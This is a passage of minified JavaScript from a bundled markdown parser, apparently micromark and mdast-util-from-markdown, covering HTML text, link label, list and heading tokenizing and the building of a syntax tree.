G===45?(a.consume(G),f):G===91?(a.consume(G),r=0,A):Xt(G)?(a.consume(G),w):t(G)}function f(G){return G===45?(a.consume(G),C):t(G)}function h(G){return G===null?t(G):G===45?(a.consume(G),E):ze(G)?(l=h,re(G)):(a.consume(G),h)}function E(G){return G===45?(a.consume(G),C):h(G)}function C(G){return G===62?Z(G):G===45?E(G):h(G)}function A(G){const J="CDATA[";return G===J.charCodeAt(r++)?(a.consume(G),r===J.length?j:A):t(G)}function j(G){return G===null?t(G):G===93?(a.consume(G),R):ze(G)?(l=j,re(G)):(a.consume(G),j)}function R(G){return G===93?(a.consume(G),I):j(G)}function I(G){return G===62?Z(G):G===93?(a.consume(G),I):j(G)}function w(G){return G===null||G===62?Z(G):ze(G)?(l=w,re(G)):(a.consume(G),w)}function k(G){return G===null?t(G):G===63?(a.consume(G),Y):ze(G)?(l=k,re(G)):(a.consume(G),k)}function Y(G){return G===62?Z(G):k(G)}function ee(G){return Xt(G)?(a.consume(G),Q):t(G)}function Q(G){return G===45||Gt(G)?(a.consume(G),Q):q(G)}function q(G){return ze(G)?(l=q,re(G)):sa(G)?(a.consume(G),q):Z(G)}function M(G){return G===45||Gt(G)?(a.consume(G),M):G===47||G===62||Na(G)?N(G):t(G)}function N(G){return G===47?(a.consume(G),Z):G===58||G===95||Xt(G)?(a.consume(G),L):ze(G)?(l=N,re(G)):sa(G)?(a.consume(G),N):Z(G)}function L(G){return G===45||G===46||G===58||G===95||Gt(G)?(a.consume(G),L):_(G)}function _(G){return G===61?(a.consume(G),V):ze(G)?(l=_,re(G)):sa(G)?(a.consume(G),_):N(G)}function V(G){return G===null||G===60||G===61||G===62||G===96?t(G):G===34||G===39?(a.consume(G),i=G,F):ze(G)?(l=V,re(G)):sa(G)?(a.consume(G),V):(a.consume(G),ce)}function F(G){return G===i?(a.consume(G),i=void 0,me):G===null?t(G):ze(G)?(l=F,re(G)):(a.consume(G),F)}function ce(G){return G===null||G===34||G===39||G===60||G===61||G===96?t(G):G===47||G===62||Na(G)?N(G):(a.consume(G),ce)}function me(G){return G===47||G===62||Na(G)?N(G):t(G)}function Z(G){return G===62?(a.consume(G),a.exit("htmlTextData"),a.exit("htmlText"),e):t(G)}function re(G){return a.exit("htmlTextData"),a.enter("lineEnding"),a.consume(G),a.exit("lineEnding"),Ee}function Ee(G){return sa(G)?ba(a,je,"linePrefix",n.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(G):je(G)}function je(G){return a.enter("htmlTextData"),l(G)}}const F1={name:"labelEnd",resolveAll:lQ,resolveTo:cQ,tokenize:uQ},oQ={tokenize:dQ},sQ={tokenize:pQ},rQ={tokenize:mQ};function lQ(a){let e=-1;const t=[];for(;++e<a.length;){const n=a[e][1];if(t.push(a[e]),n.type==="labelImage"||n.type==="labelLink"||n.type==="labelEnd"){const i=n.type==="labelImage"?4:2;n.type="data",e+=i}}return a.length!==t.length&&Dn(a,0,a.length,t),a}function cQ(a,e){let t=a.length,n=0,i,r,l,u;for(;t--;)if(i=a[t][1],r){if(i.type==="link"||i.type==="labelLink"&&i._inactive)break;a[t][0]==="enter"&&i.type==="labelLink"&&(i._inactive=!0)}else if(l){if(a[t][0]==="enter"&&(i.type==="labelImage"||i.type==="labelLink")&&!i._balanced&&(r=t,i.type!=="labelLink")){n=2;break}}else i.type==="labelEnd"&&(l=t);const d={type:a[r][1].type==="labelLink"?"link":"image",start:{...a[r][1].start},end:{...a[a.length-1][1].end}},p={type:"label",start:{...a[r][1].start},end:{...a[l][1].end}},f={type:"labelText",start:{...a[r+n+2][1].end},end:{...a[l-2][1].start}};return u=[["enter",d,e],["enter",p,e]],u=Wn(u,a.slice(r+1,r+n+3)),u=Wn(u,[["enter",f,e]]),u=Wn(u,gg(e.parser.constructs.insideSpan.null,a.slice(r+n+4,l-3),e)),u=Wn(u,[["exit",f,e],a[l-2],a[l-1],["exit",p,e]]),u=Wn(u,a.slice(l+1)),u=Wn(u,[["exit",d,e]]),Dn(a,r,a.length,u),a}function uQ(a,e,t){const n=this;let i=n.events.length,r,l;for(;i--;)if((n.events[i][1].type==="labelImage"||n.events[i][1].type==="labelLink")&&!n.events[i][1]._balanced){r=n.events[i][1];break}return u;function u(E){return r?r._inactive?h(E):(l=n.parser.defined.includes(Ci(n.sliceSerialize({start:r.end,end:n.now()}))),a.enter("labelEnd"),a.enter("labelMarker"),a.consume(E),a.exit("labelMarker"),a.exit("labelEnd"),d):t(E)}function d(E){return E===40?a.attempt(oQ,f,l?f:h)(E):E===91?a.attempt(sQ,f,l?p:h)(E):l?f(E):h(E)}function p(E){return a.attempt(rQ,f,h)(E)}function f(E){return e(E)}function h(E){return r._balanced=!0,t(E)}}function dQ(a,e,t){return n;function n(h){return a.enter("resource"),a.enter("resourceMarker"),a.consume(h),a.exit("resourceMarker"),i}function i(h){return Na(h)?kd(a,r)(h):r(h)}function r(h){return h===41?f(h):oM(a,l,u,"resourceDestination","resourceDestinationLiteral","resourceDestinationLiteralMarker","resourceDestinationRaw","resourceDestinationString",32)(h)}function l(h){return Na(h)?kd(a,d)(h):f(h)}function u(h){return t(h)}function d(h){return h===34||h===39||h===40?rM(a,p,t,"resourceTitle","resourceTitleMarker","resourceTitleString")(h):f(h)}function p(h){return Na(h)?kd(a,f)(h):f(h)}function f(h){return h===41?(a.enter("resourceMarker"),a.consume(h),a.exit("resourceMarker"),a.exit("resource"),e):t(h)}}function pQ(a,e,t){const n=this;return i;function i(u){return sM.call(n,a,r,l,"reference","referenceMarker","referenceString")(u)}function r(u){return n.parser.defined.includes(Ci(n.sliceSerialize(n.events[n.events.length-1][1]).slice(1,-1)))?e(u):t(u)}function l(u){return t(u)}}function mQ(a,e,t){return n;function n(r){return a.enter("reference"),a.enter("referenceMarker"),a.consume(r),a.exit("referenceMarker"),i}function i(r){return r===93?(a.enter("referenceMarker"),a.consume(r),a.exit("referenceMarker"),a.exit("reference"),e):t(r)}}const fQ={name:"labelStartImage",resolveAll:F1.resolveAll,tokenize:hQ};function hQ(a,e,t){const n=this;return i;function i(u){return a.enter("labelImage"),a.enter("labelImageMarker"),a.consume(u),a.exit("labelImageMarker"),r}function r(u){return u===91?(a.enter("labelMarker"),a.consume(u),a.exit("labelMarker"),a.exit("labelImage"),l):t(u)}function l(u){return u===94&&"_hiddenFootnoteSupport"in n.parser.constructs?t(u):e(u)}}const gQ={name:"labelStartLink",resolveAll:F1.resolveAll,tokenize:bQ};function bQ(a,e,t){const n=this;return i;function i(l){return a.enter("labelLink"),a.enter("labelMarker"),a.consume(l),a.exit("labelMarker"),a.exit("labelLink"),r}function r(l){return l===94&&"_hiddenFootnoteSupport"in n.parser.constructs?t(l):e(l)}}const sy={name:"lineEnding",tokenize:vQ};function vQ(a,e){return t;function t(n){return a.enter("lineEnding"),a.consume(n),a.exit("lineEnding"),ba(a,e,"linePrefix")}}const Kf={name:"thematicBreak",tokenize:yQ};function yQ(a,e,t){let n=0,i;return r;function r(p){return a.enter("thematicBreak"),l(p)}function l(p){return i=p,u(p)}function u(p){return p===i?(a.enter("thematicBreakSequence"),d(p)):n>=3&&(p===null||ze(p))?(a.exit("thematicBreak"),e(p)):t(p)}function d(p){return p===i?(a.consume(p),n++,d):(a.exit("thematicBreakSequence"),sa(p)?ba(a,u,"whitespace")(p):u(p))}}const fn={continuation:{tokenize:TQ},exit:AQ,name:"list",tokenize:CQ},EQ={partial:!0,tokenize:PQ},SQ={partial:!0,tokenize:xQ};function CQ(a,e,t){const n=this,i=n.events[n.events.length-1];let r=i&&i[1].type==="linePrefix"?i[2].sliceSerialize(i[1],!0).length:0,l=0;return u;function u(C){const A=n.containerState.type||(C===42||C===43||C===45?"listUnordered":"listOrdered");if(A==="listUnordered"?!n.containerState.marker||C===n.containerState.marker:P0(C)){if(n.containerState.type||(n.containerState.type=A,a.enter(A,{_container:!0})),A==="listUnordered")return a.enter("listItemPrefix"),C===42||C===45?a.check(Kf,t,p)(C):p(C);if(!n.interrupt||C===49)return a.enter("listItemPrefix"),a.enter("listItemValue"),d(C)}return t(C)}function d(C){return P0(C)&&++l<10?(a.consume(C),d):(!n.interrupt||l<2)&&(n.containerState.marker?C===n.containerState.marker:C===41||C===46)?(a.exit("listItemValue"),p(C)):t(C)}function p(C){return a.enter("listItemMarker"),a.consume(C),a.exit("listItemMarker"),n.containerState.marker=n.containerState.marker||C,a.check(_p,n.interrupt?t:f,a.attempt(EQ,E,h))}function f(C){return n.containerState.initialBlankLine=!0,r++,E(C)}function h(C){return sa(C)?(a.enter("listItemPrefixWhitespace"),a.consume(C),a.exit("listItemPrefixWhitespace"),E):t(C)}function E(C){return n.containerState.size=r+n.sliceSerialize(a.exit("listItemPrefix"),!0).length,e(C)}}function TQ(a,e,t){const n=this;return n.containerState._closeFlow=void 0,a.check(_p,i,r);function i(u){return n.containerState.furtherBlankLines=n.containerState.furtherBlankLines||n.containerState.initialBlankLine,ba(a,e,"listItemIndent",n.containerState.size+1)(u)}function r(u){return n.containerState.furtherBlankLines||!sa(u)?(n.containerState.furtherBlankLines=void 0,n.containerState.initialBlankLine=void 0,l(u)):(n.containerState.furtherBlankLines=void 0,n.containerState.initialBlankLine=void 0,a.attempt(SQ,e,l)(u))}function l(u){return n.containerState._closeFlow=!0,n.interrupt=void 0,ba(a,a.attempt(fn,e,t),"linePrefix",n.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(u)}}function xQ(a,e,t){const n=this;return ba(a,i,"listItemIndent",n.containerState.size+1);function i(r){const l=n.events[n.events.length-1];return l&&l[1].type==="listItemIndent"&&l[2].sliceSerialize(l[1],!0).length===n.containerState.size?e(r):t(r)}}function AQ(a){a.exit(this.containerState.type)}function PQ(a,e,t){const n=this;return ba(a,i,"listItemPrefixWhitespace",n.parser.constructs.disable.null.includes("codeIndented")?void 0:5);function i(r){const l=n.events[n.events.length-1];return!sa(r)&&l&&l[1].type==="listItemPrefixWhitespace"?e(r):t(r)}}const kP={name:"setextUnderline",resolveTo:LQ,tokenize:RQ};function LQ(a,e){let t=a.length,n,i,r;for(;t--;)if(a[t][0]==="enter"){if(a[t][1].type==="content"){n=t;break}a[t][1].type==="paragraph"&&(i=t)}else a[t][1].type==="content"&&a.splice(t,1),!r&&a[t][1].type==="definition"&&(r=t);const l={type:"setextHeading",start:{...a[n][1].start},end:{...a[a.length-1][1].end}};return a[i][1].type="setextHeadingText",r?(a.splice(i,0,["enter",l,e]),a.splice(r+1,0,["exit",a[n][1],e]),a[n][1].end={...a[r][1].end}):a[n][1]=l,a.push(["exit",l,e]),a}function RQ(a,e,t){const n=this;let i;return r;function r(p){let f=n.events.length,h;for(;f--;)if(n.events[f][1].type!=="lineEnding"&&n.events[f][1].type!=="linePrefix"&&n.events[f][1].type!=="content"){h=n.events[f][1].type==="paragraph";break}return!n.parser.lazy[n.now().line]&&(n.interrupt||h)?(a.enter("setextHeadingLine"),i=p,l(p)):t(p)}function l(p){return a.enter("setextHeadingLineSequence"),u(p)}function u(p){return p===i?(a.consume(p),u):(a.exit("setextHeadingLineSequence"),sa(p)?ba(a,d,"lineSuffix")(p):d(p))}function d(p){return p===null||ze(p)?(a.exit("setextHeadingLine"),e(p)):t(p)}}const IQ={tokenize:wQ};function wQ(a){const e=this,t=a.attempt(_p,n,a.attempt(this.parser.constructs.flowInitial,i,ba(a,a.attempt(this.parser.constructs.flow,i,a.attempt(_G,i)),"linePrefix")));return t;function n(r){if(r===null){a.consume(r);return}return a.enter("lineEndingBlank"),a.consume(r),a.exit("lineEndingBlank"),e.currentConstruct=void 0,t}function i(r){if(r===null){a.consume(r);return}return a.enter("lineEnding"),a.consume(r),a.exit("lineEnding"),e.currentConstruct=void 0,t}}const jQ={resolveAll:cM()},DQ=lM("string"),MQ=lM("text");function lM(a){return{resolveAll:cM(a==="text"?NQ:void 0),tokenize:e};function e(t){const n=this,i=this.parser.constructs[a],r=t.attempt(i,l,u);return l;function l(f){return p(f)?r(f):u(f)}function u(f){if(f===null){t.consume(f);return}return t.enter("data"),t.consume(f),d}function d(f){return p(f)?(t.exit("data"),r(f)):(t.consume(f),d)}function p(f){if(f===null)return!0;const h=i[f];let E=-1;if(h)for(;++E<h.length;){const C=h[E];if(!C.previous||C.previous.call(n,n.previous))return!0}return!1}}}function cM(a){return e;function e(t,n){let i=-1,r;for(;++i<=t.length;)r===void 0?t[i]&&t[i][1].type==="data"&&(r=i,i++):(!t[i]||t[i][1].type!=="data")&&(i!==r+2&&(t[r][1].end=t[i-1][1].end,t.splice(r+2,i-r-2),i=r+2),r=void 0);return a?a(t,n):t}}function NQ(a,e){let t=0;for(;++t<=a.length;)if((t===a.length||a[t][1].type==="lineEnding")&&a[t-1][1].type==="data"){const n=a[t-1][1],i=e.sliceStream(n);let r=i.length,l=-1,u=0,d;for(;r--;){const p=i[r];if(typeof p=="string"){for(l=p.length;p.charCodeAt(l-1)===32;)u++,l--;if(l)break;l=-1}else if(p===-2)d=!0,u++;else if(p!==-1){r++;break}}if(e._contentTypeTextTrailing&&t===a.length&&(u=0),u){const p={type:t===a.length||d||u<2?"lineSuffix":"hardBreakTrailing",start:{_bufferIndex:r?l:n.start._bufferIndex+l,_index:n.start._index+r,line:n.end.line,column:n.end.column-u,offset:n.end.offset-u},end:{...n.end}};n.end={...p.start},n.start.offset===n.end.offset?Object.assign(n,p):(a.splice(t,0,["enter",p,e],["exit",p,e]),t+=2)}t++}return a}const _Q={42:fn,43:fn,45:fn,48:fn,49:fn,50:fn,51:fn,52:fn,53:fn,54:fn,55:fn,56:fn,57:fn,62:aM},qQ={91:zG},kQ={[-2]:oy,[-1]:oy,32:oy},OQ={35:QG,42:Kf,45:[kP,Kf],60:YG,61:kP,95:Kf,96:_P,126:_P},UQ={38:nM,92:tM},zQ={[-5]:sy,[-4]:sy,[-3]:sy,33:fQ,38:nM,42:L0,60:[gG,nQ],91:gQ,92:[HG,tM],93:F1,95:L0,96:IG},BQ={null:[L0,jQ]},FQ={null:[42,95]},VQ={null:[]},HQ=Object.freeze(Object.defineProperty({__proto__:null,attentionMarkers:FQ,contentInitial:qQ,disable:VQ,document:_Q,flow:OQ,flowInitial:kQ,insideSpan:BQ,string:UQ,text:zQ},Symbol.toStringTag,{value:"Module"}));function GQ(a,e,t){let n={_bufferIndex:-1,_index:0,line:t&&t.line||1,column:t&&t.column||1,offset:t&&t.offset||0};const i={},r=[];let l=[],u=[];const d={attempt:q(ee),check:q(Q),consume:w,enter:k,exit:Y,interrupt:q(Q,{interrupt:!0})},p={code:null,containerState:{},defineSkip:j,events:[],now:A,parser:a,previous:null,sliceSerialize:E,sliceStream:C,write:h};let f=e.tokenize.call(p,d);return e.resolveAll&&r.push(e),p;function h(_){return l=Wn(l,_),R(),l[l.length-1]!==null?[]:(M(e,0),p.events=gg(r,p.events,p),p.events)}function E(_,V){return JQ(C(_),V)}function C(_){return QQ(l,_)}function A(){const{_bufferIndex:_,_index:V,line:F,column:ce,offset:me}=n;return{_bufferIndex:_,_index:V,line:F,column:ce,offset:me}}function j(_){i[_.line]=_.column,L()}function R(){let _;for(;n._index<l.length;){const V=l[n._index];if(typeof V=="string")for(_=n._index,n._bufferIndex<0&&(n._bufferIndex=0);n._index===_&&n._bufferIndex<V.length;)I(V.charCodeAt(n._bufferIndex));else I(V)}}function I(_){f=f(_)}function w(_){ze(_)?(n.line++,n.column=1,n.offset+=_===-3?2:1,L()):_!==-1&&(n.column++,n.offset++),n._bufferIndex<0?n._index++:(n._bufferIndex++,n._bufferIndex===l[n._index].length&&(n._bufferIndex=-1,n._index++)),p.previous=_}function k(_,V){const F=V||{};return F.type=_,F.start=A(),p.events.push(["enter",F,p]),u.push(F),F}function Y(_){const V=u.pop();return V.end=A(),p.events.push(["exit",V,p]),V}function ee(_,V){M(_,V.from)}function Q(_,V){V.restore()}function q(_,V){return F;function F(ce,me,Z){let re,Ee,je,G;return Array.isArray(ce)?de(ce):"tokenize"in ce?de([ce]):J(ce);function J(_e){return Xe;function Xe(xa){const ha=xa!==null&&_e[xa],St=xa!==null&&_e.null,tn=[...Array.isArray(ha)?ha:ha?[ha]:[],...Array.isArray(St)?St:St?[St]:[]];return de(tn)(xa)}}function de(_e){return re=_e,Ee=0,_e.length===0?Z:B(_e[Ee])}function B(_e){return Xe;function Xe(xa){return G=N(),je=_e,_e.partial||(p.currentConstruct=_e),_e.name&&p.parser.constructs.disable.null.includes(_e.name)?Oe():_e.tokenize.call(V?Object.assign(Object.create(p),V):p,d,Re,Oe)(xa)}}function Re(_e){return _(je,G),me}function Oe(_e){return G.restore(),++Ee<re.length?B(re[Ee]):Z}}}function M(_,V){_.resolveAll&&!r.includes(_)&&r.push(_),_.resolve&&Dn(p.events,V,p.events.length-V,_.resolve(p.events.slice(V),p)),_.resolveTo&&(p.events=_.resolveTo(p.events,p))}function N(){const _=A(),V=p.previous,F=p.currentConstruct,ce=p.events.length,me=Array.from(u);return{from:ce,restore:Z};function Z(){n=_,p.previous=V,p.currentConstruct=F,p.events.length=ce,u=me,L()}}function L(){n.line in i&&n.column<2&&(n.column=i[n.line],n.offset+=i[n.line]-1)}}function QQ(a,e){const t=e.start._index,n=e.start._bufferIndex,i=e.end._index,r=e.end._bufferIndex;let l;if(t===i)l=[a[t].slice(n,r)];else{if(l=a.slice(t,i),n>-1){const u=l[0];typeof u=="string"?l[0]=u.slice(n):l.shift()}r>0&&l.push(a[i].slice(0,r))}return l}function JQ(a,e){let t=-1;const n=[];let i;for(;++t<a.length;){const r=a[t];let l;if(typeof r=="string")l=r;else switch(r){case-5:{l="\r";break}case-4:{l=`
`;break}case-3:{l=`\r
`;break}case-2:{l=e?" ":"	";break}case-1:{if(!e&&i)continue;l=" ";break}default:l=String.fromCharCode(r)}i=r===-2,n.push(l)}return n.join("")}function WQ(a){const n={constructs:ZD([HQ,...(a||{}).extensions||[]]),content:i(cG),defined:[],document:i(dG),flow:i(IQ),lazy:{},string:i(DQ),text:i(MQ)};return n;function i(r){return l;function l(u){return GQ(n,r,u)}}}function KQ(a){for(;!iM(a););return a}const OP=/[\0\t\n\r]/g;function YQ(){let a=1,e="",t=!0,n;return i;function i(r,l,u){const d=[];let p,f,h,E,C;for(r=e+(typeof r=="string"?r.toString():new TextDecoder(l||void 0).decode(r)),h=0,e="",t&&(r.charCodeAt(0)===65279&&h++,t=void 0);h<r.length;){if(OP.lastIndex=h,p=OP.exec(r),E=p&&p.index!==void 0?p.index:r.length,C=r.charCodeAt(E),!p){e=r.slice(h);break}if(C===10&&h===E&&n)d.push(-3),n=void 0;else switch(n&&(d.push(-5),n=void 0),h<E&&(d.push(r.slice(h,E)),a+=E-h),C){case 0:{d.push(65533),a++;break}case 9:{for(f=Math.ceil(a/4)*4,d.push(-2);a++<f;)d.push(-1);break}case 10:{d.push(-4),a=1;break}default:n=!0,a=1}h=E+1}return u&&(n&&d.push(-5),e&&d.push(e),d.push(null)),d}}const $Q=/\\([!-/:-@[-`{-~])|&(#(?:\d{1,7}|x[\da-f]{1,6})|[\da-z]{1,31});/gi;function XQ(a){return a.replace($Q,ZQ)}function ZQ(a,e,t){if(e)return e;if(t.charCodeAt(0)===35){const i=t.charCodeAt(1),r=i===120||i===88;return eM(t.slice(r?2:1),r?16:10)}return B1(t)||a}const uM={}.hasOwnProperty;function eJ(a,e,t){return typeof e!="string"&&(t=e,e=void 0),aJ(t)(KQ(WQ(t).document().write(YQ()(a,e,!0))))}function aJ(a){const e={transforms:[],canContainEols:["emphasis","fragment","heading","paragraph","strong"],enter:{autolink:r(qa),autolinkProtocol:N,autolinkEmail:N,atxHeading:r(Ii),blockQuote:r(St),characterEscape:N,characterReference:N,codeFenced:r(tn),codeFencedFenceInfo:l,codeFencedFenceMeta:l,codeIndented:r(tn,l),codeText:r(Ve,l),codeTextData:N,data:N,codeFlowValue:N,definition:r(ti),definitionDestinationString:l,definitionLabelString:l,definitionTitleString:l,emphasis:r(nn),hardBreakEscape:r(on),hardBreakTrailing:r(on),htmlFlow:r(Nn,l),htmlFlowData:N,htmlText:r(Nn,l),htmlTextData:N,image:r(mo),label:l,link:r(qa),listItem:r(Ba),listItemValue:E,listOrdered:r(za,h),listUnordered:r(za),paragraph:r(zt),reference:B,referenceString:l,resourceDestinationString:l,resourceTitleString:l,setextHeading:r(Ii),strong:r(fo),thematicBreak:r(ni)},exit:{atxHeading:d(),atxHeadingSequence:ee,autolink:d(),autolinkEmail:ha,autolinkProtocol:xa,blockQuote:d(),characterEscapeValue:L,characterReferenceMarkerHexadecimal:Oe,characterReferenceMarkerNumeric:Oe,characterReferenceValue:_e,characterReference:Xe,codeFenced:d(R),codeFencedFence:j,codeFencedFenceInfo:C,codeFencedFenceMeta:A,codeFlowValue:L,codeIndented:d(I),codeText:d(me),codeTextData:L,data:L,definition:d(),definitionDestinationString:Y,definitionLabelString:w,definitionTitleString:k,emphasis:d(),hardBreakEscape:d(V),hardBreakTrailing:d(V),htmlFlow:d(F),htmlFlowData:L,htmlText:d(ce),htmlTextData:L,image:d(re),label:je,labelText:Ee,lineEnding:_,link:d(Z),listItem:d(),listOrdered:d(),listUnordered:d(),paragraph:d(),referenceString:Re,resourceDestinationString:G,resourceTitleString:J,resource:de,setextHeading:d(M),setextHeadingLineSequence:q,setextHeadingText:Q,strong:d(),thematicBreak:d()}};dM(e,(a||{}).mdastExtensions||[]);const t={};return n;function n(fe){let Pe={type:"root",children:[]};const X={stack:[Pe],tokenStack:[],config:e,enter:u,exit:p,buffer:l,resume:f,data:t},ye=[];let we=-1;for(;++we<fe.length;)if(fe[we][1].type==="listOrdered"||fe[we][1].type==="listUnordered")if(fe[we][0]==="enter")ye.push(we);else{const Ae=ye.pop();we=i(fe,Ae,we)}for(we=-1;++we<fe.length;){const Ae=e[fe[we][0]];uM.call(Ae,fe[we][1].type)&&Ae[fe[we][1].type].call(Object.assign({sliceSerialize:fe[we][2].sliceSerialize},X),fe[we][1])}if(X.tokenStack.length>0){const Ae=X.tokenStack[X.tokenStack.length-1];(Ae[1]||UP).call(X,void 0,Ae[0])}for(Pe.position={start:Ds(fe.length>0?fe[0][1].start:{line:1,column:1,offset:0}),end:Ds(fe.length>0?fe[fe.length-2][1].end:{line:1,column:1,offset:0})},we=-1;++we<e.transforms.length;)Pe=e.transforms[we](Pe)||Pe;return Pe}function i(fe,Pe,X){let ye=Pe-1,we=-1,Ae=!1,Qe,ma,ra,ya;for(;++ye<=X;){const We=fe[ye];switch(We[1].type){case"listUnordered":case"listOrdered":case"blockQuote":{We[0]==="enter"?we++:we--,ya=void 0;break}case"lineEndingBlank":{We[0]==="enter"&&(Qe&&!ya&&!we&&!ra&&(ra=ye),ya=void 0);break}case"linePrefix":case"listItemValue":case"listItemMarker":case"listItemPrefix":case"listItemPrefixWhitespace":break;default:ya=void 0}if(!we&&We[0]==="enter"&&We[1].type==="listItemPrefix"||we===-1&&We[0]==="exit"&&(We[1].type==="listUnordered"||We[1].type==="listOrdered")){if(Qe){let jt=ye;for(ma=void 0;jt--;){const Ct=fe[jt];if(Ct[1].type==="lineEnding"||Ct[1].type==="lineEndingBlank"){if(Ct[0]==="exit")continue;ma&&(fe[ma][1].type="lineEndingBlank",Ae=!0),Ct[1].type="lineEnding",ma=jt}else if(!(Ct[1].type==="linePrefix"||Ct[1].type==="blockQuotePrefix"||Ct[1].type==="blockQuotePrefixWhitespace"||Ct[1].type==="blockQuoteMarker"||Ct[1].type==="listItemIndent"))break}ra&&(!ma||ra<ma)&&(Qe._spread=!0),Qe.end=Object.assign({},ma?fe[ma][1].start:We[1].end),fe.splice(ma||ye,0,["exit",Qe,We[2]]),ye++,X++}if(We[1].type==="listItemPrefix"){const jt={type:"listItem",_spread:!1,start:Object.assign({},We[1].start),end:void 0};Qe=jt,fe.splice(ye,0,["enter",jt,We[2]]),ye++,X++,ra=void 0,ya=!0}}}return fe[Pe][1]._spread=Ae,X}function r(fe,Pe){return X;function X(ye){u.call(this,fe(ye),ye),Pe&&Pe.call(this,ye)}}function l(){this.stack.push({type:"fragment",children:[]})}function u(fe,Pe,X){this.stack[this.stack.length-1].children.push(fe),this.stack.push(fe),this.tokenStack.push([Pe,X||void 0]),fe.position={start:Ds(Pe.start),end:void 0}}function d(fe){return Pe;function Pe(X){fe&&fe.call(this,X),p.call(this,X)}}function p(fe,Pe){const X=this.stack.pop(),ye=this.tokenStack.pop();if(ye)ye[0].type!==fe.type&&(Pe?Pe.call(this,fe,ye[0]):(ye[1]||UP).call(this,fe,ye[0]));else throw new Error("Cannot close `"+fe.type+"` ("+qd({start:fe.start,end:fe.end})+"): its not open");X.position.end=Ds(fe.end)}function f(){return z1(this.stack.pop())}function h(){this.data.expectingFirstListItemValue=!0}function E(fe){if(this.data.expectingFirstListItemValue){const Pe=this.stack[this.stack.length-2];Pe.start=Number.parseInt(this.sliceSerialize(fe),10),this.data.expectingFirstListItemValue=void 0}}function C(){const fe=this.resume(),Pe=this.stack[this.stack.length-1];Pe.lang=fe}function A(){const fe=this.resume(),Pe=this.stack[this.stack.length-1];Pe.meta=fe}function j(){this.data.flowCodeInside||(this.buffer(),this.data.flowCodeInside=!0)}function R(){const fe=this.resume(),Pe=this.stack[this.stack.length-1];Pe.value=fe.replace(/^(\r?\n|\r)|(\r?\n|\r)$/g,""),this.data.flowCodeInside=void 0}function I(){const fe=this.resume(),Pe=this.stack[this.stack.length-1];Pe.value=fe.replace(/(\r?\n|\r)$/g,"")}function w(fe){const Pe=this.resume(),X=this.stack[this.stack.length-1];X.label=Pe,X.identifier=Ci(this.sliceSerialize(fe)).toLowerCase()}function k(){const fe=this.resume(),Pe=this.stack[this.stack.length-1];Pe.title=fe}function Y(){const fe=this.resume(),Pe=this.stack[this.stack.length-1];Pe.url=fe}function ee(fe){const Pe=this.stack[this.stack.length-1];if(!Pe.depth){const X=this.sliceSerialize(fe).length;Pe.depth=X}}function Q(){this.data.setextHeadingSlurpLineEnding=!0}function q(fe){const Pe=this.stack[this.stack.length-1];Pe.depth=this.sliceSerialize(fe).codePointAt(0)===61?1:2}function M(){this.data.setextHeadingSlurpLineEnding=void 0}function N(fe){const X=this.stack[this.stack.length-1].children;let ye=X[X.length-1];(!ye||ye.type!=="text")&&(ye=ht(),ye.position={start:Ds(fe.start),end:void 0},X.push(ye)),this.stack.push(ye)}function L(fe){const Pe=this.stack.pop();Pe.value+=this.sliceSerialize(fe),Pe.position.end=Ds(fe.end)}function _(fe){const Pe=this.stack[this.stack.length-1];if(this.data.atHardBreak){const X=Pe.children[Pe.children.length-1];X.position.end=Ds(fe.end),this.data.atHardBreak=void 0;return}!this.data.setextHeadingSlurpLineEnding&&e.canContainEols.includes(Pe.type)&&(N.call(this,fe),L.call(this,fe))}function V(){this.data.atHardBreak=!0}function F(){const fe=this.resume(),Pe=this.stack[this.stack.length-1];Pe.value=fe}function ce(){const fe=this.resume(),Pe=this.stack[this.stack.length-1];Pe.value=fe}function me(){const fe=this.resume(),Pe=this.stack[this.stack.length-1];Pe.value=fe}function Z(){const fe=this.stack[this.stack.length-1];if(this.data.inReference){const Pe=this.data.referenceType||"shortcut";fe.type+="Reference",fe.referenceType=Pe,delete fe.url,delete fe.title}else delete fe.identifier,delete fe.label;this.data.referenceType=void 0}function re(){const fe=this.stack[this.stack.length-1];if(this.data.inReference){const Pe=this.data.referenceType||"shortcut";fe.type+="Reference",fe.referenceType=Pe,delete fe.url,delete fe.title}else delete fe.identifier,delete fe.label;this.data.referenceType=void 0}function Ee(fe){const Pe=this.sliceSerialize(fe),X=this.stack[this.stack.length-2];X.label=XQ(Pe),X.identifier=Ci(Pe).toLowerCase()}function je(){const fe=this.stack[this.stack.length-1],Pe=this.resume(),X=this.stack[this.stack.length-1];if(this.data.inReference=!0,X.type==="link"){const ye=fe.children;X.children=ye}else X.alt=Pe}function G(){const fe=this.resume(),Pe=this.stack[this.stack.length-1];Pe.url=fe}function J(){const fe=this.resume(),Pe=this.stack[this.stack.length-1];Pe.title=fe}function de(){this.data.inReference=void 0}function B(){this.data.referenceType="collapsed"}function Re(fe){const Pe=this.resume(),X=this.stack[this.stack.length-1];X.label=Pe,X.identifier=Ci(this.sliceSerialize(fe)).toLowerCase(),this.data.referenceType="full"}function Oe(fe){this.data.characterReferenceType=fe.type}function _e(fe){const Pe=this.sliceSerialize(fe),X=this.data.characterReferenceType;let ye;X?(ye=eM(Pe,X==="characterReferenceMarkerNumeric"?10:16),this.data.characterReferenceType=void 0):ye=B1(Pe);const we=this.stack[this.stack.length-1];we.value+=ye}function Xe(fe){const Pe=this.stack.pop();Pe.position.end=Ds(fe.end)}function xa(fe){L.call(this,fe);const Pe=this.stack[this.stack.length-1];Pe.url=this.sliceSerialize(fe)}function ha(fe){L.call(this,fe);const Pe=this.stack[this.stack.length-1];Pe.url="mailto:"+this.sliceSerialize(fe)}function St(){return{type:"blockquote",children:[]}}function tn(){return{type:"code",lang:null,meta:null,value:""}}function Ve(){return{type:"inlineCode",value:""}}function ti(){return{type:"definition",identifier:"",label:null,title:null,url:""}}function nn(){return{type:"emphasis",children:[]}}function Ii(){return{type:"heading",depth:0,children:[]}}function on(){return{type:"break"}}function Nn(){return{type:"html",value:""}}function mo(){return{type:"image",title:null,url:"",alt:null}}function qa(){return{type:"link",title:null,url:"",children:[]}}function za(fe){return{type:"list",ordered:fe.type==="listOrdered",start:null,spread:fe._spread,children:[]}}function Ba(fe){return{type:"listItem",spread:fe._spread,checked:null,children:[]}}function zt(){return{type:"paragraph",children:[]}}function fo(){return{type:"strong",children:[]}}function ht(){return{type:"text",value:""}}function ni(){return{type:"thematicBreak"}}}function Ds(a){return{line:a.line,column:a.column,offset:a.offset}}function dM(a,e){let t=-1;for(;++t<e.length;){const 